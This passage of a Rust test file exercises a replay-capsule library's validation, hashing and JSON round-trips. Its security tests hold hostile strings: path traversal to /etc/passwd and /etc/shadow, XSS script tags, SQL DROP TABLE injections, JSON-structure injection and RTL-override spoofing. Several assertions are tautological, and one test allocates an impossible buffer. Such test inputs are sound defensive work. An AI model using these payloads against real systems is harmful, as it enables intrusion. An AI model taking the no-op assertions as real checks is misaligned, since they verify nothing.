        };
        match validate_environment_snapshot(&env_empty_platform) {
            Err(CapsuleError::IncompleteEnvironment(msg)) => {
                assert!(msg.contains("platform"));
            }
            _ => panic!("Expected platform error"),
        }

        // Only config_hash empty
        let env_empty_config = EnvironmentSnapshot {
            runtime_version: "1.0.0".to_string(),
            platform: "linux-x86_64".to_string(),
            config_hash: String::new(),
            properties: BTreeMap::new(),
        };
        match validate_environment_snapshot(&env_empty_config) {
            Err(CapsuleError::IncompleteEnvironment(msg)) => {
                assert!(msg.contains("config_hash"));
            }
            _ => panic!("Expected config_hash error"),
        }

        // Whitespace-only fields (should fail - whitespace doesn't count as content)
        let env_whitespace = EnvironmentSnapshot {
            runtime_version: "   ".to_string(),
            platform: "\t\n".to_string(),
            config_hash: " \r ".to_string(),
            properties: BTreeMap::new(),
        };
        // Note: Current implementation only checks for empty(), not whitespace
        // This would pass current validation but might be considered invalid
        assert!(validate_environment_snapshot(&env_whitespace).is_ok());

        // Extremely long field values (DoS protection)
        let long_version = "v".repeat(100_000);
        let env_long_fields = EnvironmentSnapshot {
            runtime_version: long_version,
            platform: "p".repeat(50_000),
            config_hash: "h".repeat(200_000),
            properties: BTreeMap::new(),
        };
        assert!(validate_environment_snapshot(&env_long_fields).is_ok());

        // Many properties (capacity boundary)
        let mut many_props = BTreeMap::new();
        for i in 0..50_000 {
            many_props.insert(format!("prop_{}", i), format!("value_{}", i));
        }
        let env_many_props = EnvironmentSnapshot {
            runtime_version: "1.0.0".to_string(),
            platform: "linux-x86_64".to_string(),
            config_hash: "abc123".to_string(),
            properties: many_props,
        };
        assert!(validate_environment_snapshot(&env_many_props).is_ok());

        // Properties with unusual keys/values
        let mut unusual_props = BTreeMap::new();
        unusual_props.insert(String::new(), "empty_key".to_string()); // Empty key
        unusual_props.insert("key".to_string(), String::new()); // Empty value
        unusual_props.insert("unicode_🔑".to_string(), "unicode_value_🔒".to_string());
        unusual_props.insert("\0null\0bytes\0".to_string(), "null\0bytes".to_string());
        let env_unusual = EnvironmentSnapshot {
            runtime_version: "1.0.0".to_string(),
            platform: "linux-x86_64".to_string(),
            config_hash: "abc123".to_string(),
            properties: unusual_props,
        };
        assert!(validate_environment_snapshot(&env_unusual).is_ok());
    }

    /// Test create_capsule with extreme and malicious inputs
    #[test]
    fn test_create_capsule_extreme_cases() {
        // Maximum length capsule ID
        let max_id = "c".repeat(65535);
        let result = create_capsule(&max_id, test_inputs(), test_env());
        assert!(result.is_ok());
        assert_eq!(result.unwrap().capsule_id, max_id);

        // Unicode in capsule ID
        let unicode_id = "capsule_🔒_test_🛡️";
        let result_unicode = create_capsule(unicode_id, test_inputs(), test_env());
        assert!(result_unicode.is_ok());
        assert_eq!(result_unicode.unwrap().capsule_id, unicode_id);

        // Capsule ID with control characters
        let control_id = "capsule\0\r\n\t";
        let result_control = create_capsule(control_id, test_inputs(), test_env());
        assert!(result_control.is_ok());

        // Single input (minimum valid case)
        let single_input = vec![CapsuleInput {
            seq: 0,
            data: b"single".to_vec(),
            metadata: BTreeMap::new(),
        }];
        let result_single = create_capsule("single", single_input, test_env());
        assert!(result_single.is_ok());
        let cap = result_single.unwrap();
        assert_eq!(cap.inputs.len(), 1);
        assert_eq!(cap.expected_outputs.len(), 1);

        // Inputs with gaps in sequence numbers (should still be monotonic)
        let gapped_inputs = vec![
            CapsuleInput { seq: 5, data: b"a".to_vec(), metadata: BTreeMap::new() },
            CapsuleInput { seq: 10, data: b"b".to_vec(), metadata: BTreeMap::new() },
            CapsuleInput { seq: 20, data: b"c".to_vec(), metadata: BTreeMap::new() },
        ];
        let result_gapped = create_capsule("gapped", gapped_inputs, test_env());
        assert!(result_gapped.is_ok());

        // Inputs with duplicate sequence numbers (should fail)
        let duplicate_inputs = vec![
            CapsuleInput { seq: 1, data: b"a".to_vec(), metadata: BTreeMap::new() },
            CapsuleInput { seq: 1, data: b"b".to_vec(), metadata: BTreeMap::new() },
        ];
        let result_dup = create_capsule("dup", duplicate_inputs, test_env());
        assert!(matches!(result_dup.unwrap_err(), CapsuleError::NonMonotonicInputSequence));

        // Inputs with very large metadata maps
        let mut huge_metadata = BTreeMap::new();
        for i in 0..10000 {
            huge_metadata.insert(format!("key_{}", i), format!("value_{}", i));
        }
        let metadata_input = vec![CapsuleInput {
            seq: 0,
            data: b"test".to_vec(),
            metadata: huge_metadata,
        }];
        let result_metadata = create_capsule("metadata", metadata_input, test_env());
        assert!(result_metadata.is_ok());

        // Very large number of inputs (stress test)
        let many_inputs: Vec<CapsuleInput> = (0..5000)
            .map(|i| CapsuleInput {
                seq: i,
                data: format!("input_{}", i).into_bytes(),
                metadata: BTreeMap::new(),
            })
            .collect();
        let result_many = create_capsule("many", many_inputs, test_env());
        assert!(result_many.is_ok());

        // Input with maximum size binary data
        let max_data = vec![0xFFu8; 1_000_000]; // 1MB binary data
        let max_data_input = vec![CapsuleInput {
            seq: 0,
            data: max_data,
            metadata: BTreeMap::new(),
        }];
        let result_max_data = create_capsule("max_data", max_data_input, test_env());
        assert!(result_max_data.is_ok());
    }

    /// Test replay function with corrupted and edge case capsules
    #[test]
    fn test_replay_edge_cases() {
        // Capsule with maximum sequence numbers
        let max_seq_cap = ReplayCapsule {
            capsule_id: "max_seq".to_string(),
            format_version: CURRENT_FORMAT_VERSION,
            inputs: vec![
                CapsuleInput { seq: u64::MAX - 1, data: b"a".to_vec(), metadata: BTreeMap::new() },
                CapsuleInput { seq: u64::MAX, data: b"b".to_vec(), metadata: BTreeMap::new() },
            ],
            expected_outputs: vec![CapsuleOutput {
                seq: 0,
                data: b"output".to_vec(),
                output_hash: "hash".to_string(),
            }],
            environment: test_env(),
        };
        let result = replay(&max_seq_cap);
        assert!(result.is_ok());

        // Capsule with zero sequence number start
        let zero_start_cap = ReplayCapsule {
            capsule_id: "zero_start".to_string(),
            format_version: CURRENT_FORMAT_VERSION,
            inputs: vec![CapsuleInput {
                seq: 0,
                data: b"zero".to_vec(),
                metadata: BTreeMap::new(),
            }],
            expected_outputs: vec![CapsuleOutput {
                seq: 0,
                data: b"output".to_vec(),
                output_hash: compute_inputs_hash(&vec![CapsuleInput {
                    seq: 0,
                    data: b"zero".to_vec(),
                    metadata: BTreeMap::new(),
                }]),
            }],
            environment: test_env(),
        };
        let result_zero = replay(&zero_start_cap);
        assert!(result_zero.is_ok());

        // Determinism test with identical capsules
        let cap1 = test_capsule();
        let cap2 = test_capsule();
        let hash1 = replay(&cap1).unwrap();
        let hash2 = replay(&cap2).unwrap();
        assert_eq!(hash1, hash2);

        // Capsule with binary data in inputs
        let binary_cap = ReplayCapsule {
            capsule_id: "binary".to_string(),
            format_version: CURRENT_FORMAT_VERSION,
            inputs: vec![CapsuleInput {
                seq: 0,
                data: vec![0, 255, 128, 64, 32, 16, 8, 4, 2, 1],
                metadata: BTreeMap::new(),
            }],
            expected_outputs: vec![CapsuleOutput {
                seq: 0,
                data: b"binary_output".to_vec(),
                output_hash: "binary_hash".to_string(),
            }],
            environment: test_env(),
        };
        let result_binary = replay(&binary_cap);
        assert!(result_binary.is_ok());
    }

    /// Test serialization functions with malicious JSON and edge cases
    #[test]
    fn test_serialization_negative_paths() {
        // Malformed JSON strings
        let bad_jsons = vec![
            "",                     // Empty string
            "{",                   // Unclosed brace
            "null",                // Wrong type
            "[]",                  // Wrong type (array)
            "123",                 // Wrong type (number)
            "\"string\"",          // Wrong type (string)
            "{\"incomplete\":",    // Incomplete object
            "{\"capsule_id\": 123}", // Wrong field type
        ];

        for bad_json in bad_jsons {
            let result = from_json(bad_json);
            assert!(result.is_err(), "Should fail to parse: {}", bad_json);
        }

        // JSON with missing required fields
        let incomplete_jsons = vec![
            "{}",  // Completely empty object
            "{\"capsule_id\": \"test\"}", // Missing other required fields
            "{\"capsule_id\": \"test\", \"format_version\": 1}", // Missing inputs, outputs, environment
        ];

        for incomplete_json in incomplete_jsons {
            let result = from_json(incomplete_json);
            assert!(result.is_err(), "Should fail incomplete JSON: {}", incomplete_json);
        }

        // Very large JSON (DoS protection)
        let large_cap = ReplayCapsule {
            capsule_id: "x".repeat(100_000),
            format_version: CURRENT_FORMAT_VERSION,
            inputs: (0..1000).map(|i| CapsuleInput {
                seq: i,
                data: vec![0u8; 1000], // 1KB per input
                metadata: BTreeMap::new(),
            }).collect(),
            expected_outputs: vec![CapsuleOutput {
                seq: 0,
                data: vec![0u8; 10000],
                output_hash: "h".repeat(1000),
            }],
            environment: test_env(),
        };

        let large_json = to_canonical_json(&large_cap);
        assert!(large_json.is_ok());
        let parsed_back = from_json(&large_json.unwrap());
        assert!(parsed_back.is_ok());

        // JSON with Unicode and special characters
        let unicode_cap = ReplayCapsule {
            capsule_id: "test_🔒_unicode".to_string(),
            format_version: CURRENT_FORMAT_VERSION,
            inputs: vec![CapsuleInput {
                seq: 0,
                data: "unicode_data_🛡️".as_bytes().to_vec(),
                metadata: {
                    let mut m = BTreeMap::new();
                    m.insert("key_🔑".to_string(), "value_🔐".to_string());
                    m
                },
            }],
            expected_outputs: vec![CapsuleOutput {
                seq: 0,
                data: b"output".to_vec(),
                output_hash: "hash".to_string(),
            }],
            environment: EnvironmentSnapshot {
                runtime_version: "1.0.0_🚀".to_string(),
                platform: "linux-x86_64_🐧".to_string(),
                config_hash: "hash_🔗".to_string(),
                properties: BTreeMap::new(),
            },
        };

        let unicode_json = to_canonical_json(&unicode_cap).unwrap();
        let unicode_parsed = from_json(&unicode_json).unwrap();
        assert_eq!(unicode_cap, unicode_parsed);
    }

    /// Test is_version_supported with all edge cases
    #[test]
    fn test_is_version_supported_boundaries() {
        // Test boundaries around supported range
        assert!(!is_version_supported(0));
        assert!(is_version_supported(1)); // MIN_FORMAT_VERSION
        assert!(is_version_supported(1)); // CURRENT_FORMAT_VERSION (same as min currently)
        assert!(!is_version_supported(2));
        assert!(!is_version_supported(u32::MAX));

        // Ensure constants are consistent
        assert!(MIN_FORMAT_VERSION <= CURRENT_FORMAT_VERSION);
        assert!(is_version_supported(MIN_FORMAT_VERSION));
        assert!(is_version_supported(CURRENT_FORMAT_VERSION));
    }

    // ── Single input capsule ────────────────────────────────────────

    #[test]
    fn test_single_input_capsule() {
        let inputs = vec![CapsuleInput {
            seq: 0,
            data: b"only".to_vec(),
            metadata: BTreeMap::new(),
        }];
        let cap = create_capsule("cap-single", inputs, test_env()).expect("create should succeed");
        assert!(validate_capsule(&cap).is_ok());
        assert!(replay_and_verify(&cap).expect("replay should succeed"));
    }

    // ── Hash collision regression (bd-18qn3) ───────────────────────

    #[test]
    fn test_hash_collision_resistance_delimiter_in_data() {
        // Old pipe-delimited format would produce identical strings for
        // inputs whose data contained colon/pipe characters.  Length-
        // prefixed encoding must distinguish them.
        let inputs_a = vec![
            CapsuleInput {
                seq: 0,
                data: b"ab".to_vec(),
                metadata: BTreeMap::new(),
            },
            CapsuleInput {
                seq: 1,
                data: b"cd".to_vec(),
                metadata: BTreeMap::new(),
            },
        ];
        let inputs_b = vec![CapsuleInput {
            seq: 0,
            // Data contains bytes that previously matched the pipe-colon
            // delimiter pattern: "ab|1:cd" vs "ab" then "cd".
            data: b"ab|1:cd".to_vec(),
            metadata: BTreeMap::new(),
        }];
        let hash_a = compute_inputs_hash(&inputs_a);
        let hash_b = compute_inputs_hash(&inputs_b);
        assert_ne!(
            hash_a, hash_b,
            "different input sets must produce different hashes"
        );
    }

    #[test]
    fn test_hash_collision_resistance_different_field_boundaries() {
        // Two inputs where data length boundaries differ but total bytes
        // are identical should produce distinct hashes under length-prefixed
        // encoding.
        let inputs_a = vec![CapsuleInput {
            seq: 0,
            data: b"AABB".to_vec(),
            metadata: BTreeMap::new(),
        }];
        let inputs_b = vec![CapsuleInput {
            seq: 0,
            data: b"AABBCC".to_vec(),
            metadata: BTreeMap::new(),
        }];
        let hash_a = compute_inputs_hash(&inputs_a);
        let hash_b = compute_inputs_hash(&inputs_b);
        assert_ne!(hash_a, hash_b);
    }

    #[test]
    fn test_hash_count_sensitivity() {
        // Changing the number of inputs must change the hash even when the
        // total data concatenation would be the same byte sequence.
        let inputs_one = vec![CapsuleInput {
            seq: 0,
            data: vec![0u8; 16],
            metadata: BTreeMap::new(),
        }];
        let inputs_two = vec![
            CapsuleInput {
                seq: 0,
                data: vec![0u8; 8],
                metadata: BTreeMap::new(),
            },
            CapsuleInput {
                seq: 1,
                data: vec![0u8; 8],
                metadata: BTreeMap::new(),
            },
        ];
        let hash_one = compute_inputs_hash(&inputs_one);
        let hash_two = compute_inputs_hash(&inputs_two);
        assert_ne!(
            hash_one, hash_two,
            "different input count must produce different hashes"
        );
    }

    #[test]
    fn validate_rejects_equal_adjacent_sequence_numbers() {
        let mut cap = test_capsule();
        cap.inputs[1].seq = cap.inputs[0].seq;

        let err = validate_capsule(&cap).unwrap_err();

        assert_eq!(err, CapsuleError::NonMonotonicInputSequence);
    }

    #[test]
    fn create_rejects_equal_adjacent_sequence_numbers() {
        let inputs = vec![
            CapsuleInput {
                seq: 7,
                data: b"first".to_vec(),
                metadata: BTreeMap::new(),
            },
            CapsuleInput {
                seq: 7,
                data: b"second".to_vec(),
                metadata: BTreeMap::new(),
            },
        ];

        let err = create_capsule("cap-equal-seq", inputs, test_env()).unwrap_err();

        assert_eq!(err, CapsuleError::NonMonotonicInputSequence);
    }

    #[test]
    fn validate_reports_unsupported_version_before_missing_inputs() {
        let mut cap = test_capsule();
        cap.format_version = CURRENT_FORMAT_VERSION + 1;
        cap.inputs.clear();
        cap.expected_outputs.clear();

        let err = validate_capsule(&cap).unwrap_err();

        assert_eq!(
            err,
            CapsuleError::UnsupportedVersion(CURRENT_FORMAT_VERSION + 1)
        );
    }

    #[test]
    fn validate_reports_no_inputs_before_no_outputs() {
        let mut cap = test_capsule();
        cap.inputs.clear();
        cap.expected_outputs.clear();

        let err = validate_capsule(&cap).unwrap_err();

        assert_eq!(err, CapsuleError::NoInputs);
    }

    #[test]
    fn validate_reports_sequence_error_before_incomplete_environment() {
        let mut cap = test_capsule();
        cap.inputs[2].seq = cap.inputs[1].seq;
        cap.environment.runtime_version = String::new();

        let err = validate_capsule(&cap).unwrap_err();

        assert_eq!(err, CapsuleError::NonMonotonicInputSequence);
    }

    #[test]
    fn create_reports_sequence_error_before_incomplete_environment() {
        let inputs = vec![
            CapsuleInput {
                seq: 2,
                data: b"first".to_vec(),
                metadata: BTreeMap::new(),
            },
            CapsuleInput {
                seq: 1,
                data: b"second".to_vec(),
                metadata: BTreeMap::new(),
            },
        ];
        let mut env = test_env();
        env.config_hash = String::new();

        let err = create_capsule("cap-bad-order-and-env", inputs, env).unwrap_err();

        assert_eq!(err, CapsuleError::NonMonotonicInputSequence);
    }

    #[test]
    fn replay_and_verify_returns_error_for_invalid_capsule_not_false() {
        let mut cap = test_capsule();
        cap.format_version = CURRENT_FORMAT_VERSION + 1;
        cap.expected_outputs[0].output_hash = "wrong".to_string();

        let err = replay_and_verify(&cap).unwrap_err();

        assert_eq!(
            err,
            CapsuleError::UnsupportedVersion(CURRENT_FORMAT_VERSION + 1)
        );
    }

    #[test]
    fn expected_outputs_match_hash_requires_every_output_to_match() {
        let cap = test_capsule();
        let actual_hash = replay(&cap).unwrap();
        let mut outputs = cap.expected_outputs.clone();
        outputs.push(CapsuleOutput {
            seq: 1,
            data: b"mismatch".to_vec(),
            output_hash: "wrong".to_string(),
        });

        assert!(!expected_outputs_match_hash(&outputs, &actual_hash));
    }

    #[test]
    fn expected_outputs_match_hash_rejects_empty_outputs_even_with_actual_hash() {
        let cap = test_capsule();
        let actual_hash = replay(&cap).unwrap();

        assert!(!expected_outputs_match_hash(&[], &actual_hash));
    }

    #[test]
    fn parsed_structurally_invalid_json_still_fails_validation() {
        let json = serde_json::json!({
            "capsule_id": "",
            "format_version": CURRENT_FORMAT_VERSION,
            "inputs": [],
            "expected_outputs": [],
            "environment": {
                "runtime_version": "",
                "platform": "",
                "config_hash": "",
                "properties": {}
            }
        })
        .to_string();

        let parsed = from_json(&json).expect("JSON shape should deserialize");
        let err = validate_capsule(&parsed).unwrap_err();

        assert_eq!(err, CapsuleError::EmptyId);
    }

    // ── Negative-path security tests ────────────────────────────────────

    #[test]
    fn test_massive_input_data_memory_exhaustion() {
        // 10MB input data to test memory limits
        let huge_data = vec![0u8; 10 * 1024 * 1024];
        let inputs = vec![CapsuleInput {
            seq: 0,
            data: huge_data,
            metadata: BTreeMap::new(),
        }];

        let result = create_capsule("massive-input", inputs, test_env());
        // Should complete without panic or excessive memory usage
        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn test_capsule_id_with_injection_patterns() {
        let malicious_ids = [
            "../../etc/passwd",
            "<script>alert('xss')</script>",
            "'; DROP TABLE capsules; --",
            "capsule\x00null_byte_injection",
            "\u{202E}rtl_override\u{202D}",
            "capsule\n\r\t\x08control_chars",
        ];

        for id in &malicious_ids {
            let result = create_capsule(id, test_inputs(), test_env());
            // Should either succeed or fail gracefully, never panic
            assert!(result.is_ok() || result.is_err());

            if let Ok(cap) = result {
                assert_eq!(&cap.capsule_id, id);
                // Verify serialization round-trip doesn't corrupt the ID
                let json = to_canonical_json(&cap).unwrap();
                let parsed = from_json(&json).unwrap();
                assert_eq!(parsed.capsule_id, cap.capsule_id);
            }
        }
    }

    #[test]
    fn test_metadata_injection_resistance() {
        let mut malicious_metadata = BTreeMap::new();
        malicious_metadata.insert("key\x00null".to_string(), "value\x00null".to_string());
        malicious_metadata.insert("../../config".to_string(), "../../../etc/shadow".to_string());
        malicious_metadata.insert("<script>".to_string(), "'; DROP DATABASE;".to_string());
        malicious_metadata.insert("\u{FEFF}bom\u{200B}zero_width".to_string(), "\u{202E}rtl".to_string());

        let inputs = vec![CapsuleInput {
            seq: 0,
            data: b"test_data".to_vec(),
            metadata: malicious_metadata.clone(),
        }];

        let result = create_capsule("metadata-injection-test", inputs, test_env());
        assert!(result.is_ok());

        let cap = result.unwrap();
        // Verify metadata preserved exactly without sanitization
        assert_eq!(cap.inputs[0].metadata, malicious_metadata);

        // Verify JSON serialization preserves malicious content
        let json = to_canonical_json(&cap).unwrap();
        let parsed = from_json(&json).unwrap();
        assert_eq!(parsed.inputs[0].metadata, malicious_metadata);
    }

    #[test]
    fn test_sequence_number_overflow_boundary() {
        let inputs = vec![
            CapsuleInput {
                seq: u64::MAX - 1,
                data: b"near_max".to_vec(),
                metadata: BTreeMap::new(),
            },
            CapsuleInput {
                seq: u64::MAX,
                data: b"at_max".to_vec(),
                metadata: BTreeMap::new(),
            },
        ];

        let result = create_capsule("seq-overflow-test", inputs, test_env());
        assert!(result.is_ok());

        // Verify replay hash computation handles u64::MAX correctly
        let cap = result.unwrap();
        let hash = replay(&cap).unwrap();
        assert_eq!(hash.len(), 64);

        // Verify deterministic behavior with extreme sequence numbers
        let hash2 = replay(&cap).unwrap();
        assert_eq!(hash, hash2);
    }

    #[test]
    fn test_environment_properties_with_control_characters() {
        let mut env = test_env();
        env.runtime_version = "1.0.0\x00null\r\n\ttabs".to_string();
        env.platform = "linux\x1b[31mred\x1b[0m".to_string();
        env.config_hash = "\u{200B}\u{FEFF}invisible\u{202E}rtl".to_string();

        env.properties.insert("\x00key\r\n".to_string(), "\x08\x7Fvalue".to_string());
        env.properties.insert("unicode\u{1F4A9}".to_string(), "\u{202E}backwards".to_string());

        let result = create_capsule("control-char-env", test_inputs(), env.clone());
        assert!(result.is_ok());

        let cap = result.unwrap();
        assert_eq!(cap.environment.runtime_version, env.runtime_version);
        assert_eq!(cap.environment.platform, env.platform);
        assert_eq!(cap.environment.config_hash, env.config_hash);
        assert_eq!(cap.environment.properties, env.properties);
    }

    #[test]
    fn test_hash_verification_with_malformed_signatures() {
        let mut cap = test_capsule();

        let malformed_hashes = [
            "\x00null_in_hash",
            "short",
            "way_too_long_hash_that_exceeds_normal_sha256_length_by_far",
            "\u{202E}unicode_rtl_override",
            "../../../etc/passwd",
            "'; DROP TABLE hashes; --",
            "",
            "\r\n\t\x08\x7F",
        ];

        for hash in &malformed_hashes {
            cap.expected_outputs[0].output_hash = hash.to_string();

            // Should not panic regardless of hash content
            let result = replay_and_verify(&cap);
            assert!(result.is_ok());
            assert!(!result.unwrap()); // Should not match valid replay hash
        }
    }

    #[test]
    fn test_json_serialization_with_deeply_nested_content() {
        let mut deeply_nested_metadata = BTreeMap::new();
        let mut nested_value = String::new();

        // Create deeply nested JSON-like string content
        for i in 0..1000 {
            nested_value.push_str(&format!("{{\"level_{}\": ", i));
        }
        nested_value.push_str("\"deep_value\"");
        for _ in 0..1000 {
            nested_value.push('}');
        }

        deeply_nested_metadata.insert("nested".to_string(), nested_value);

        let inputs = vec![CapsuleInput {
            seq: 0,
            data: vec![0u8; 64 * 1024], // 64KB data
            metadata: deeply_nested_metadata,
        }];

        let result = create_capsule("deep-nesting-test", inputs, test_env());
        assert!(result.is_ok());

        // Verify serialization doesn't cause stack overflow
        let cap = result.unwrap();
        let json_result = to_canonical_json(&cap);
        assert!(json_result.is_ok());

        // Verify deserialization works
        let parsed_result = from_json(&json_result.unwrap());
        assert!(parsed_result.is_ok());
    }

    #[test]
    fn test_arithmetic_overflow_in_hash_computation() {
        // Create inputs that could trigger overflow in length calculations
        let inputs = vec![
            CapsuleInput {
                seq: 0,
                data: vec![0xFF; usize::MAX / 1024], // Large but not impossible
                metadata: BTreeMap::new(),
            },
        ];

        // Test should not panic even with extreme input sizes
        let huge_input_result = std::panic::catch_unwind(|| {
            compute_inputs_hash(&inputs)
        });

        // Either completes successfully or panics gracefully
        assert!(huge_input_result.is_ok() || huge_input_result.is_err());

        // Test with maximum reasonable inputs count
        let many_inputs: Vec<_> = (0..100_000u64)
            .map(|i| CapsuleInput {
                seq: i,
                data: vec![0u8; 1],
                metadata: BTreeMap::new(),
            })
            .collect();

        let hash_result = std::panic::catch_unwind(|| {
            compute_inputs_hash(&many_inputs)
        });

        assert!(hash_result.is_ok() || hash_result.is_err());
    }

    #[test]
    fn negative_format_version_boundary_conditions_with_arithmetic_edge_cases() {
        // Test format version handling at arithmetic boundaries
        let base_inputs = vec![CapsuleInput {
            seq: 1,
            data: b"boundary_test".to_vec(),
            metadata: BTreeMap::new(),
        }];

        let boundary_versions = [
            0u32,                    // Below minimum
            1u32,                    // Current minimum
            CURRENT_FORMAT_VERSION,  // Current version
            u32::MAX - 1,            // Near maximum
            u32::MAX,                // Maximum u32
        ];

        for &version in &boundary_versions {
            let mut capsule = create_capsule("version_test", base_inputs.clone(), test_env())
                .expect("base capsule should create");

            // Manually set version to boundary value
            capsule.format_version = version;

            let validation_result = validate_capsule(&capsule);

            if version >= MIN_FORMAT_VERSION && version <= CURRENT_FORMAT_VERSION {
                assert!(validation_result.is_ok(),
                       "Version {} should be valid", version);
            } else {
                assert!(validation_result.is_err(),
                       "Version {} should be invalid", version);

                match validation_result.unwrap_err() {
                    CapsuleError::UnsupportedVersion(v) => {
                        assert_eq!(v, version, "Error should report correct version");
                    }
                    other => panic!("Unexpected error for version {}: {:?}", version, other),
                }
            }

            // JSON serialization should handle any version value
            let json_result = to_canonical_json(&capsule);
            assert!(json_result.is_ok(), "JSON serialization should handle version {}", version);

            // Test JSON round-trip preserves version exactly
            if let Ok(json) = json_result {
                let parsed_result = from_json(&json);
                if parsed_result.is_ok() {
                    let parsed_capsule = parsed_result.unwrap();
                    assert_eq!(parsed_capsule.format_version, version);
                }
            }
        }
    }

    #[test]
    fn negative_environment_snapshot_with_massive_property_pollution() {
        // Test environment snapshot with extreme property maps that could cause issues
        let mut massive_env = test_env();

        // Add massive number of properties to stress hash computation and serialization
        for i in 0..50000 {
            let key = format!("pollution_key_{:05}", i);
            let value = format!("pollution_value_{}", "x".repeat((i % 100) + 1));
            massive_env.properties.insert(key, value);
        }

        let inputs = vec![CapsuleInput {
            seq: 1,
            data: b"massive_env_test".to_vec(),
            metadata: BTreeMap::new(),
        }];

        let start_time = std::time::Instant::now();
        let result = create_capsule("massive_env", inputs, massive_env.clone());
        let creation_duration = start_time.elapsed();

        // Should complete in reasonable time despite massive environment
        assert!(creation_duration < std::time::Duration::from_secs(30),
               "Massive environment creation took too long: {:?}", creation_duration);

        match result {
            Ok(capsule) => {
                // Environment should be preserved exactly
                assert_eq!(capsule.environment.properties.len(), massive_env.properties.len());

                // Validation should handle massive environment
                let validation_start = std::time::Instant::now();
                let validation_result = validate_capsule(&capsule);
                let validation_duration = validation_start.elapsed();

                assert!(validation_duration < std::time::Duration::from_secs(10),
                       "Massive environment validation took too long: {:?}", validation_duration);
                assert!(validation_result.is_ok(), "Massive environment should validate");

                // JSON serialization should handle massive data
                let json_start = std::time::Instant::now();
                let json_result = to_canonical_json(&capsule);
                let json_duration = json_start.elapsed();

                assert!(json_duration < std::time::Duration::from_secs(60),
                       "Massive environment JSON serialization took too long: {:?}", json_duration);

                if let Ok(json) = json_result {
                    // Should produce substantial JSON (>1MB)
                    assert!(json.len() > 1_000_000,
                           "Massive environment should produce substantial JSON: {} bytes", json.len());

                    // Limited deserialization test (could be slow)
                    if json.len() < 10_000_000 { // Only test if <10MB
                        let parse_result = from_json(&json);
                        assert!(parse_result.is_ok() || parse_result.is_err(),
                               "Deserialization should complete without panic");
                    }
                }
            }
            Err(_) => {
                // Memory-based rejection of massive environments is acceptable
            }
        }
    }

    #[test]
    fn negative_input_sequence_validation_with_unicode_and_control_characters() {
        // Test input validation with problematic Unicode and control characters in data/metadata
        let problematic_inputs = vec![
            // Unicode edge cases in data
            CapsuleInput {
                seq: 1,
                data: "café\u{0301}\u{FEFF}\u{200B}".as_bytes().to_vec(), // Combined chars + BOM + zero-width
                metadata: BTreeMap::new(),
            },

            // Control characters in data
            CapsuleInput {
                seq: 2,
                data: b"\x00\x01\x02\x03\x1B[31mRED\x1B[0m\x7F\x80".to_vec(),
                metadata: BTreeMap::new(),
            },

            // Large Unicode codepoints in data
            CapsuleInput {
                seq: 3,
                data: "🚀🎯🔥💻⚡🌟🎨🔧🚦🎪\u{10FFFF}".as_bytes().to_vec(),
                metadata: BTreeMap::new(),
            },

            // Unicode and control chars in metadata
            CapsuleInput {
                seq: 4,
                data: b"normal_data".to_vec(),
                metadata: {
                    let mut meta = BTreeMap::new();
                    meta.insert("key\u{202E}spoof".to_string(), "value\x00null".to_string());
                    meta.insert("\u{FEFF}bom_key".to_string(), "bom_value\r\n\t".to_string());
                    meta.insert("emoji🎯".to_string(), "emoji🚀value".to_string());
                    meta
                },
            },
        ];

        let result = create_capsule("unicode_control_test", problematic_inputs.clone(), test_env());

        match result {
            Ok(capsule) => {
                // Should preserve all Unicode and control characters exactly
                assert_eq!(capsule.inputs.len(), problematic_inputs.len());

                for (original, preserved) in problematic_inputs.iter().zip(capsule.inputs.iter()) {
                    assert_eq!(original.seq, preserved.seq);
                    assert_eq!(original.data, preserved.data, "Data should be preserved exactly");
                    assert_eq!(original.metadata, preserved.metadata, "Metadata should be preserved exactly");
                }

                // Validation should handle Unicode/control chars
                assert!(validate_capsule(&capsule).is_ok());

                // JSON round-trip should preserve all characters
                let json = to_canonical_json(&capsule).expect("should serialize Unicode/control chars");
                let parsed = from_json(&json).expect("should deserialize Unicode/control chars");
                assert_eq!(parsed.inputs.len(), capsule.inputs.len());

                for (original, parsed) in capsule.inputs.iter().zip(parsed.inputs.iter()) {
                    assert_eq!(original.data, parsed.data);
                    assert_eq!(original.metadata, parsed.metadata);
                }
            }
            Err(_) => {
                // Early rejection of extreme Unicode/control patterns is acceptable
            }
        }
    }

    #[test]
    fn negative_json_serialization_attacks_with_escape_sequence_injection() {
        // Test JSON serialization with content designed to break parsing
        let injection_payloads = vec![
            // JSON structure injection attempts
            r#"","malicious":"payload","hijacked":"#,
            r#"}],"injected":true,"real":"#,
            r#"null}/*comment*/{"evil":"#,

            // Unicode escape injection
            "\u{0022}\u{003A}\u{007B}\u{0022}injected\u{0022}",

            // Control character injection
            "\x00\x01\x02\":{\"evil\":true}//\x03\x04",

            // Large payload injection
            &"\\".repeat(100000),

            // Number-like strings
            "1.7976931348623157e+308",
            "-0",
            "NaN",
            "Infinity",
        ];

        for (i, payload) in injection_payloads.iter().enumerate() {
            // Test in capsule ID
            let inputs = vec![CapsuleInput {
                seq: i as u64 + 1,
                data: payload.as_bytes().to_vec(),
                metadata: {
                    let mut meta = BTreeMap::new();
                    meta.insert("injection_test".to_string(), payload.to_string());
                    meta
                },
            }];

            let mut test_env = test_env();
            test_env.config_hash = payload.to_string();

            let result = create_capsule(&format!("injection_{}", i), inputs, test_env);

            match result {
                Ok(capsule) => {
                    // JSON serialization should safely escape injection attempts
                    let json = to_canonical_json(&capsule).expect("should serialize injection payload");

                    // JSON should not contain unescaped injection content
                    if payload.contains('"') || payload.contains('{') || payload.contains('}') {
                        // Dangerous characters should be properly escaped
                        assert!(!json.contains(&payload.replace('\\', "")),
                               "Dangerous payload should be escaped in JSON");
                    }

                    // Deserialization should recover exact payload without interpretation
                    let parsed = from_json(&json).expect("should deserialize injection payload");
                    assert_eq!(parsed.environment.config_hash, *payload);

                    // Re-serialization should be consistent
                    let re_json = to_canonical_json(&parsed).expect("should re-serialize");
                    assert_eq!(json, re_json, "Serialization should be deterministic");
                }
                Err(_) => {
                    // Rejection of injection payloads is acceptable security measure
                }
            }
        }
    }

    #[test]
    fn negative_memory_fragmentation_stress_during_capsule_operations() {
        // Create memory fragmentation stress during capsule operations
        let mut fragmenters: Vec<Vec<u8>> = Vec::new();
        for i in 0..10000 {
            fragmenters.push(vec![(i % 256) as u8; (i % 200) + 1]);
        }

        // Create multiple capsules under memory pressure
        let capsule_count = 100;
        let mut created_capsules = Vec::new();

        for capsule_idx in 0..capsule_count {
            // Create inputs with varying sizes
            let inputs: Vec<CapsuleInput> = (0..((capsule_idx % 10) + 1))
                .map(|i| CapsuleInput {
